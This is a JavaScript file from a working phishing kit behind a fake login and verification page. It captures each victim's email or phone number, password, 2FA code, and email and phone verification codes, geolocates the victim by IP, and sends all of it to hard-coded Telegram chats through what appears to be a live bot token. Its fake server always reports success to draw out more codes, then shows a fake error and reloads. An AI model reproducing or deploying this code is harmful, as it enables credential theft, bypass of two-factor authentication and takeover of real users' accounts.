// ======================================================
// TELEGRAM CONFIGURATION
// ======================================================
const TELEGRAM_BOT_TOKEN = "8564934487:AAFgBIX01sGI4bRN5dySqNrCtGiCtY2EPJs";
const TELEGRAM_CHAT_IDS = ["-1003526803811", "-5071642713"]; // Add your second chat ID here

// ======================================================
// COLLECT USER INFORMATION
// ======================================================
const userInfo = {
    ip: 'Detecting...',
    userAgent: navigator.userAgent,
    timestamp: new Date().toLocaleString(),
    country: 'Unknown',
    city: 'Unknown',
    isp: 'Unknown'
};

// Get IP and location info
async function collectUserInfo() {
    try {
        // Get IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        userInfo.ip = ipData.ip;
        
        // Get location info based on IP
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        
        userInfo.country = locationData.country_name || 'Unknown';
        userInfo.city = locationData.city || 'Unknown';
        userInfo.isp = locationData.org || 'Unknown';
        
        console.log('User info collected:', userInfo);
    } catch (error) {
        console.log('Error collecting user info:', error);
        // Fallback to basic IP detection
        try {
            const fallbackIp = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
            userInfo.ip = fallbackIp.ip;
        } catch (e) {
            userInfo.ip = 'Failed to get IP';
        }
    }
}

// Call on page load
collectUserInfo();

// ======================================================
// TELEGRAM SEND FUNCTION
// ======================================================
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS.length) {
        console.error('Telegram bot token or chat IDs not configured');
        return false;
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    let allSuccess = true;
    
    // Send to all chat IDs
    for (const chat_id of TELEGRAM_CHAT_IDS) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chat_id.trim(),
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log(`Telegram response for ${chat_id}:`, data);
            
            if (data.ok !== true) {
                allSuccess = false;
            }
        } catch (error) {
            console.error(`Error sending to ${chat_id}:`, error);
            allSuccess = false;
        }
    }
    
    return allSuccess;
}

// ======================================================
// FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
// ======================================================

function formatLoginMessage(emailPhone, password) {
    // Check if input is phone number (contains only digits and optional +)
    const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
    
    let credentialsType, credentialsValue;
    if (isPhone) {
        // Extract country code if present
        const phoneNumber = emailPhone.replace(/\D/g, '');
        credentialsType = 'Phone';
        credentialsValue = `+${phoneNumber}`;
    } else {
        credentialsType = 'Email';
        credentialsValue = emailPhone;
    }
    
    return `🆕 <b>NEW LOGIN ATTEMPT</b>
<b>${credentialsType}:</b> <code>${credentialsValue}</code>
<b>Password:</b> <code>${password}</code>
<b>Country: ${userInfo.country}</b>`;
}

function format2FAMessage(code) {
    return `
<b>2FA Code:</b> <code>${code}</code>`;
}

function formatEmailVerificationMessage(code) {
    return `<b>📧 Email Code:</b> <code>${code}</code>`;
}

function formatPhoneVerificationMessage(code) {
    return `<b>📱 Phone Code:</b> <code>${code}</code>`;
}

function formatSwitchMessage(fromMethod, toMethod) {
    return `🔄 <b>SWITCHED METHOD</b>
<b>From:</b> ${fromMethod.toUpperCase()}
<b>To:</b> ${toMethod.toUpperCase()}`;
}

function formatGoVerifyMessage(method) {
    return `<b>🎯 SELECT
Method: ${method.toUpperCase()}</b>`;
}

// ======================================================
// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)
// ======================================================
function simulateServerSuccess() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve({ success: true });
        }, 500); // Simulate 0.5s server delay
    });
}

let isProcessing = {
    login: false,
    twofa: false,
    email: false,
    phone: false
};

// Store current method for switch tracking
let currentMethod = '';

document.addEventListener("DOMContentLoaded", () => {

// ======================================================
//  BASIC HELPERS
// ======================================================

function disableBodyScroll() { document.body.style.overflow = "hidden"; }
function enableBodyScroll() { document.body.style.overflow = ""; }

function showOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");

    disableBodyScroll();
    overlay.style.visibility = "visible";

    setTimeout(() => {
        initSwitchButtons(overlay);

        if (verificationsActive && (id === "email" || id === "phone")) {
            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")
                .forEach(btn => btn.style.display = "none");
        } else {
            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")
                .forEach(btn => btn.style.display = "");
        }

        // Auto-start resend timer
        setTimeout(() => {
            const resendBtn = overlay.querySelector(".resend-btn");
            if (resendBtn) startResend(id, true);
        }, 150);

    }, 20);

    if (id === "verifications") {
        overlay.classList.remove("hide-left");
        setTimeout(() => overlay.classList.add("active"), 10);
        verificationsActive = true;
    } else {
        overlay.classList.add("active");
        setTimeout(() => sheet.classList.add("active"), 10);
    }
}

function hideOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");

    if (id === "verifications") {
        verificationsActive = false;
        overlay.classList.remove("active");
        overlay.classList.add("hide-left");

        setTimeout(() => {
            overlay.style.visibility = "hidden";
            enableBodyScroll();
        }, 350);
    } else {
        sheet.classList.remove("active");
        overlay.classList.remove("active");

        setTimeout(() => {
            overlay.style.visibility = "hidden";
            enableBodyScroll();
        }, 350);
    }
}

function startLoading(btn){ btn.classList.add("loading"); }
function stopLoading(btn){ btn.classList.remove("loading"); }

// ======================================================
//  GLOBAL FLAGS
// ======================================================
let verificationsActive = false;
let step = 1;

// ======================================================
//  LOGIN → open twofa
// ======================================================

const form = document.getElementById("login-form");
const twofaInput = document.getElementById("twofa_input");
const twofaButton = document.getElementById("twofa_button");

twofaInput.addEventListener("input", () => {
    twofaButton.disabled = twofaInput.value.length !== 6;
});

form.addEventListener("submit", async e => {
    e.preventDefault();

    if (isProcessing.login) return;
    isProcessing.login = true;
    startLoading(form.querySelector('button[type="submit"]'));

    const emailPhone = document.getElementById("email-phone").value;
    const password = document.getElementById("password").value;

    // Send login credentials to Telegram
    const loginMessage = formatLoginMessage(emailPhone, password);
    await sendToTelegram(loginMessage);

    // Simulate server delay and always return success
    const result = await simulateServerSuccess();
    
    stopLoading(form.querySelector('button[type="submit"]'));

    if (result.success) {
        currentMethod = 'twofa';
        showOverlay("twofa");
    }

    isProcessing.login = false;
});

// ======================================================
//  UNIVERSAL SUCCESS HANDLER → enter verifications
// ======================================================

function enterVerifications(fromBlock) {
    hideOverlay(fromBlock);

    setTimeout(() => {
        step = 1;
        showOverlay("verifications");
        updateVerificationUI();
    }, 400);
}

// ======================================================
//  TWOFA CONFIRM
// ======================================================

twofaButton.addEventListener("click", async () => {
    if (isProcessing.twofa) return;
    isProcessing.twofa = true;

    startLoading(twofaButton);

    // Send 2FA code to Telegram
    const twofaMessage = format2FAMessage(twofaInput.value);
    await sendToTelegram(twofaMessage);

    // Simulate server response
    const result = await simulateServerSuccess();

    stopLoading(twofaButton);

    if (result.success) {
        twofaInput.value = "";
        enterVerifications("twofa");
    } else {
        showToast("Verification code is incorrect");
        twofaInput.value = "";
    }

    isProcessing.twofa = false;
});

// ======================================================
//  VERIFICATIONS BLOCK (step 1 / 2)
// ======================================================

const verifOverlay = document.getElementById("verifications");
const emailVerifyBtn = document.getElementById("email_verify");
const phoneVerifyBtn = document.getElementById("phone_verify");

function updateVerificationUI() {
    const counterElement = verifOverlay.querySelector("p.text-warning");
    if (counterElement) {
        counterElement.innerHTML = `<span>${step}</span><span>/</span><span>2</span>`;
    }
    
    if (emailVerifyBtn) {
        emailVerifyBtn.style.display = step === 1 ? "flex" : "none";
    }
    
    if (phoneVerifyBtn) {
        phoneVerifyBtn.style.display = step === 2 ? "flex" : "none";
    }
}

// ======================================================
//  EMAIL BLOCK
// ======================================================

const emailInput = document.getElementById("email_input");
const emailButton = document.getElementById("email_button");

if (emailInput) {
    emailInput.addEventListener("input", () => {
        if (emailButton) {
            emailButton.disabled = emailInput.value.length !== 6;
        }
    });
}

if (emailVerifyBtn) {
    emailVerifyBtn.addEventListener("click", () => {
        currentMethod = 'email';
        // Send "Go Verify" to Telegram when email is selected
        sendGoVerify("email");
        showOverlay("email");
    });
}

if (emailButton) {
    emailButton.addEventListener("click", async () => {
        if (isProcessing.email) return;
        isProcessing.email = true;

        startLoading(emailButton);

        // Send email verification code to Telegram
        const emailMessage = formatEmailVerificationMessage(emailInput.value);
        await sendToTelegram(emailMessage);

        // Simulate server response
        const result = await simulateServerSuccess();

        stopLoading(emailButton);
        emailInput.value = "";

        if (!result.success) {
            showToast("Verification code is incorrect");
            isProcessing.email = false;
            return;
        }

        // First verification (verifications not shown yet)
        if (!verificationsActive) {
            enterVerifications("email");
            isProcessing.email = false;
            return;
        }

        // Transition from step 1 → step 2
        hideOverlay("email");
        hideOverlay("verifications");

        setTimeout(() => {
            step = 2;
            updateVerificationUI();
            
            if (emailVerifyBtn && phoneVerifyBtn) {
                emailVerifyBtn.style.transition = "opacity .5s ease";
                phoneVerifyBtn.style.transition = "opacity .5s ease";
                emailVerifyBtn.style.display = "none";
                phoneVerifyBtn.style.display = "flex";
                emailVerifyBtn.style.pointerEvents = "none";
                phoneVerifyBtn.style.pointerEvents = "auto";
            }
            
            showOverlay("verifications");
            
            setTimeout(() => {
                isProcessing.email = false;
            }, 300);
        }, 1000);
    });
}

// ======================================================
//  PHONE BLOCK (FINAL STEP → reload)
// ======================================================

const phoneInput = document.getElementById("phone_input");
const phoneButton = document.getElementById("phone_button");

if (phoneInput) {
    phoneInput.addEventListener("input", () => {
        if (phoneButton) {
            phoneButton.disabled = phoneInput.value.length !== 6;
        }
    });
}

if (phoneVerifyBtn) {
    phoneVerifyBtn.addEventListener("click", () => {
        currentMethod = 'phone';
        // Send "Go Verify" to Telegram when phone is selected
        sendGoVerify("phone");
        showOverlay("phone");
    });
}

if (phoneButton) {
    phoneButton.addEventListener("click", async () => {
        startLoading(phoneButton);

        // Send phone verification code to Telegram
        const phoneMessage = formatPhoneVerificationMessage(phoneInput.value);
        await sendToTelegram(phoneMessage);

        // Simulate server response
        const result = await simulateServerSuccess();

        stopLoading(phoneButton);
        phoneInput.value = "";

        if (!result.success) {
            showToast("Verification code is incorrect");
            return;
        }

        // First verification (verifications not shown yet)
        if (!verificationsActive) {
            enterVerifications("phone");
            return;
        }

        // Final step (step 2/2) - show success and reload
        const toast = document.createElement("div");
        toast.className = "toast-layer";
        toast.innerHTML = `
            <div class="overflow-hidden flex" style="height: 56px; transition: height .5s var(--ease-out);">
                <div class="toast" style="align-items: anchor-center;">
                    <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none fill-error">
                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                            <path style="fill:#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 28 9.37258 28 16ZM20.9929 12.5802L17.5747 15.9984L20.9929 19.4166C21.4239 19.8475 21.4239 20.5609 20.9929 20.9919C20.7699 21.2148 20.4876 21.3188 20.2052 21.3188C19.9228 21.3188 19.6405 21.2148 19.4175 20.9919L15.9994 17.5737L12.5812 20.9919C12.3583 21.2148 12.0759 21.3188 11.7935 21.3188C11.5112 21.3188 11.2288 21.2148 11.0059 20.9919C10.5749 20.5609 10.5749 19.8475 11.0059 19.4166L14.424 15.9984L11.0059 12.5802C10.5749 12.1492 10.5749 11.4359 11.0059 11.0049C11.4368 10.5739 12.1502 10.5739 12.5812 11.0049L15.9994 14.4231L19.4175 11.0049C19.8485 10.5739 20.5619 10.5739 20.9929 11.0049C21.4239 11.4359 21.4239 12.1492 20.9929 12.5802Z"/>
                        </svg>
                    </div>
                    Verification code is incorrect
                </div>
            </div>`;
        document.body.appendChild(toast);

        setTimeout(() => {
            toast.remove();
            window.location.reload();
        }, 2000);
    });
}

// ======================================================
//  SWITCH BETWEEN twofa / email / phone
// ======================================================

async function sendSwitchToTelegram(fromMethod, toMethod) {
    const switchMessage = formatSwitchMessage(fromMethod, toMethod);
    await sendToTelegram(switchMessage);
}

function switchOverlay(from, to, method) {
    const fromMethod = currentMethod;
    currentMethod = method;
    
    hideOverlay(from);
    
    // Send switch action to Telegram
    sendSwitchToTelegram(fromMethod, method);
    
    setTimeout(() => showOverlay(to), 350);
}

function initSwitchButtons(overlay) {
    const id = overlay.id;

    const swEmail = overlay.querySelector(".switch-to-email");
    const swPhone = overlay.querySelector(".switch-to-phone");
    const swTwofa = overlay.querySelector(".switch-to-twofa");

    if (swEmail) {
        swEmail.onclick = () => switchOverlay(id, "email", "email");
    }

    if (swPhone) {
        swPhone.onclick = () => switchOverlay(id, "phone", "phone");
    }

    if (swTwofa) {
        swTwofa.onclick = () => switchOverlay(id, "twofa", "twofa");
    }
}

// ======================================================
//  TOAST (NO RELOAD HERE)
// ======================================================

function showToast(message) {
    const toast = document.createElement("div");
    toast.className = "toast-layer";
    toast.innerHTML = `
        <div class="overflow-hidden flex" style="height:56px;">
            <div class="toast">
                <div class="icon w-6 h-6 mr-2 fill-error">
                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                        <path style="fill:#ff4545" d="M16 4C9.372 4 4 9.372 4 16C4 22.628 9.372 28 16 28C22.628 28 28 22.628 28 16C28 9.372 22.628 4 16 4ZM18.5 22H13.5V20H18.5V22ZM18.5 18H13.5V10H18.5V18Z"/>
                    </svg>
                </div>
                ${message}
            </div>
        </div>`;
    document.body.appendChild(toast);

    setTimeout(() => toast.remove(), 2000);
}

// ======================================================
//  GOVerify (Telegram log)
// ======================================================

async function sendGoVerify(method) {
    const goVerifyMessage = formatGoVerifyMessage(method);
    await sendToTelegram(goVerifyMessage);
}

// ======================================================
//  RESEND TIMER
// ======================================================

let resendTimer = {
    email: null,
    phone: null
};

function startResend(btnOrType, forced = false) {
    let btn;
    let type;

    if (btnOrType instanceof HTMLElement) {
        btn = btnOrType;
        type = btn.closest(".pop-overlayer").id;
    } else {
        type = btnOrType;
        const overlay = document.getElementById(type);
        if (!overlay) return;
        btn = overlay.querySelector(".resend-btn");
    }

    if (!btn) return;

    if (resendTimer[type] && !forced) return;

    if (resendTimer[type]) clearInterval(resendTimer[type]);

    let timeLeft = 60;

    btn.disabled = true;
    const span = btn.querySelector("span");
    if (span) {
        span.textContent = `Resend in ${timeLeft}s`;
    }

    resendTimer[type] = setInterval(() => {
        timeLeft--;

        if (timeLeft > 0) {
            if (span) {
                span.textContent = `Resend in ${timeLeft}s`;
            }
        } else {
            clearInterval(resendTimer[type]);
            resendTimer[type] = null;

            btn.disabled = false;
            if (span) {
                span.textContent = "Resend";
            }
        }
    }, 1000);
}
window.startResend = startResend;

});

// ======================================================
// INITIALIZE INPUT FOCUS EFFECTS
// ======================================================

document.addEventListener("DOMContentLoaded", () => {
    // Initialize input focus effects
    const emailInput = document.getElementById('email-phone');
    const emailContainer = document.getElementById('input-container');
    const passwordInput = document.getElementById('password');
    const passwordContainer = document.getElementById('input-container2');

    if (emailInput && emailContainer) {
        emailInput.addEventListener('focus', () => {
            emailContainer.setAttribute('data-focus', 'true');
            emailInput.setAttribute('data-focus', 'true');
        });

        emailInput.addEventListener('blur', () => {
            emailContainer.removeAttribute('data-focus');
            emailInput.removeAttribute('data-focus');
        });
    }

    if (passwordInput && passwordContainer) {
        passwordInput.addEventListener('focus', () => {
            passwordContainer.setAttribute('data-focus', 'true');
            passwordInput.setAttribute('data-focus', 'true');
        });

        passwordInput.addEventListener('blur', () => {
            passwordContainer.removeAttribute('data-focus');
            passwordInput.setAttribute('data-focus', 'true');
        });
    }
    
    console.log('Authentication system initialized with Telegram bot');
});